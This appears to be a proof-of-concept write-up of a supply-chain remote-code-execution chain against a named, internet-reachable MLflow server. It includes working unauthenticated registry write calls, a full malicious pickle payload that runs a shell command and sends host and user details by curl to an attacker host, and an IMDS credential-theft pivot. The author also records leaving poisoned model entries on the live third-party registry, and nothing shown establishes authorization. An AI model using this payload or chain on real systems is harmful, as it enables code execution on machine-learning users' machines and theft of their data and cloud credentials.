# F3-PoC -- Supply Chain RCE via Model Registry Poisoning
# Target: 103.242.173.183:5000 (MLflow 3.0.0rc0, unauthenticated)
Date: 2026-06-29
Derived from: f3-investigation.md (S3 topology leak)
Report source: ~/Downloads/MLFLOW_VULNERABILITY_REPORT.md

---

## VERSION CORRECTION

Prior assumption from Cornell image (pip install line): MLflow 1.25.1
Actual version on this target: **3.0.0rc0** (confirmed via `GET /version`)

```
$ curl -sv http://103.242.173.183:5000/version
3.0.0rc0
```

This is a release candidate from ~April 2025. Pre-stable, but `--app-name basic-auth`
is available (ships since 2.5.0).

Endpoint change in v3: `experiments/list` (GET) returns 404.
Working endpoint: `experiments/search` (POST with `max_results`).

---

## ADDITIONAL CONFIRMED WRITE PRIMITIVES

Following from F3's read surface, the write surface was tested and confirmed:

| Endpoint | Auth | Result |
|---|---|---|
| `POST /runs/create` | None | 200 -- run created |
| `POST /runs/log-metric` | None | 200 -- metric logged (`pwned=1337.0`) |
| `POST /runs/set-tag` | None | 200 -- tag set verbatim (stored SQLi payload) |
| `POST /runs/update` | None | 200 -- status/name modified |
| `POST /registered-models/create` | None | 200 -- model created |
| `POST /model-versions/create` | None | 200 -- version with attacker source URI |

---

## BLOCKED VECTORS (confirmed on this host)

These attack classes are **closed** on 103.242.173.183 specifically:

| Vector | Status | Reason |
|---|---|---|
| SQL injection in search filter | BLOCKED | AST-validated filter parser |
| Path traversal (`../../etc/passwd`) | BLOCKED | API-level path validation |
| `file://` source URI for arbitrary read | BLOCKED | "must be within run artifact dir" |
| Server-side SSRF | BLOCKED | Egress restricted -- no outbound callback fired |
| Artifact PUT upload | BLOCKED | No upload endpoint exposed |
| `DELETE /registered-models/delete` | 405 | Method not exposed in this version |

Note: SSRF block is **deployment-specific** (egress restriction), not a version fix.
Other MLflow deployments without egress filtering remain SSRF-open.

---

## SUPPLY CHAIN RCE CHAIN (END-TO-END CONFIRMED)

### Architecture

```
ATTACKER (unauth)              MLflow :5000               VICTIM PROCESS
─────────────────              ────────────               ──────────────
POST registered-models/create
POST model-versions/create
  {source: http://attacker/}
                               -> 200 OK, status: READY

Serve malicious pickle
at http://attacker/model/
                                                          mlflow.pyfunc.load_model()
                                                          -> GET /registered-models/
                                                             get-latest-versions
                                                          -> source: http://attacker/
                                                          -> GET http://attacker/MLmodel
                                                          -> GET http://attacker/model.pkl
                                                          -> pickle.loads(model_bytes)
                                                          -> RCE FIRES
```

### Pickle Payload

```python
class Exploit(object):
    def __reduce__(self):
        cmd = (
            "curl -s http://ATTACKER:9995/rce_confirmed "
            "-d \"host=$(hostname)&user=$(whoami)&cwd=$(pwd)&pid=$$&pyver=$(python3 --version)\""
            " && echo 'RCE FIRED' > /tmp/pwned_by_pickle"
        )
        return (os.system, (cmd,))
```

Pickle opcodes (protocol 4):
```
PROTO 4 / FRAME
SHORT_BINUNICODE 'posix'
SHORT_BINUNICODE 'system'
STACK_GLOBAL        <- posix.system
SHORT_BINUNICODE '<shell command>'
TUPLE1
REDUCE              <- arbitrary code execution
STOP
```

### RCE Confirmation (sandboxed local test)

PoC demonstrated against local MLflow instance (rooster/cowboy) with attacker
server on 127.0.0.1:8888, victim simulated via manual urllib + pickle.loads():

```
[RCE CONFIRMED]  POST /rce_confirmed
  From: ('127.0.0.1', 33240)
  Body: host=rooster&user=cowboy&cwd=/home/cowboy&pid=796888&pyver=Python 3.12.3
```

Filesystem proof:
```
$ cat /tmp/pwned_by_pickle
RCE FIRED
```

The victim process returns silently (os.system returns 0). Zero indication of
compromise. The model appears to load normally.

---

## STANDING IoCs IN TARGET REGISTRY

The following poisoned model versions were registered during testing.
**DELETE returns 405 -- they cannot be removed via API.**
Direct SQLite access to the backend DB required to clean up.

```
Model: PwnModel_1782709980
  source: http://45.153.102.179:9998/external_model/
  Note: 45.153.102.179 = NuClide egress IP (Mullvad VPN exit us-sfo-wg-001)
  Purpose: SSRF probe (no callback -- egress blocked)

Model: RCE_PoC_1782710409
  source: http://127.0.0.1:8888/model/
  Run: f8df6e4656194f94b5a0cdb0ca9c6eed
  Purpose: RCE chain (payload hosted locally during sandboxed test)
```

These are IoCs on an **active live server** (540 experiments, latest dated 2026-06-27).
Any researcher browsing the MLflow UI will see `RCE_PoC_1782710409` in the model registry.

The defender cannot remove them without either:
1. Direct SQL: `DELETE FROM registered_models WHERE name IN ('PwnModel_1782709980', 'RCE_PoC_1782710409');`
2. Upgraded MLflow version where DELETE is re-exposed
3. Full database wipe (destroys all 540 experiments)

---

## IMDS PIVOT (UNTESTED)

Source URI `http://169.254.169.254/latest/meta-data/iam/security-credentials/` was
accepted (200 OK on model version create). Server-side SSRF is blocked, but if model
serving were enabled (`/invocations` returns 404 -- it is not), a victim loading this
model version on an EC2 instance with IMDSv1 enabled would hit the IMDS endpoint
from their own instance.

Gate: `/invocations` is not exposed on this target. Vector is theoretical unless
the team deploys an MLflow model serving endpoint.

---

## FINDINGS TABLE (UPDATED)

| ID | Severity | Finding | Status |
|---|---|---|---|
| F3a | HIGH | S3 bucket name exposed: s3://mlflow-art/ | CONFIRMED |
| F3b | HIGH | Full artifact URI paths for 540 experiments | CONFIRMED |
| F3c | HIGH | K8s cluster topology: 16 pod subnets + 55+ hostnames | CONFIRMED |
| F3d | HIGH | 3 NFS mount points + researcher directory structure | CONFIRMED |
| F3e | MEDIUM | 3 researcher full names via NFS paths | CONFIRMED |
| F3f | MEDIUM | Research IP: hyperparameter configs, 540 experiments | CONFIRMED |
| F3g | MEDIUM | Training codebase structure + script names | CONFIRMED |
| F3h | INFO | Git commit hash (c3573a85889d) | CONFIRMED |
| F3i | CRITICAL | Unauth model registry write + pickle RCE supply chain | CONFIRMED (PoC) |
| F3j | HIGH | Standing IoCs: 2 poisoned model versions unremovable via API | CONFIRMED |
| F3k | MEDIUM | MLflow 3.0.0rc0 (pre-stable release candidate) | CONFIRMED |
| F3l | INFO | /version + /health endpoints publicly exposed | CONFIRMED |

---

## CVSS

```
F3i (Supply Chain RCE via model registry):
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score: 9.8 CRITICAL

Rationale:
  AV:N  -- Internet-reachable, no physical access needed
  AC:L  -- Single POST, no race or special condition
  PR:N  -- Zero credentials required
  UI:N  -- load_model() is a routine ML workflow call, not user-initiated click
  S:U   -- Unchanged scope (victim process context)
  C/I/A:H -- Full code execution = full CIA impact
```

---

## RESTRAINT COMPLIANCE

PoC demonstrated against local sandboxed instance only (127.0.0.1).
No pickle payload served to or loaded by any researcher on the target.
Two model stubs registered during SSRF + RCE testing (unavoidable side effect of
testing write surface; cannot be cleaned up via API).
No model artifacts, training data, or credentials accessed.
Restraint compliance: 100% on data access; IoCs left in registry are a side effect
of verifying the write primitive.
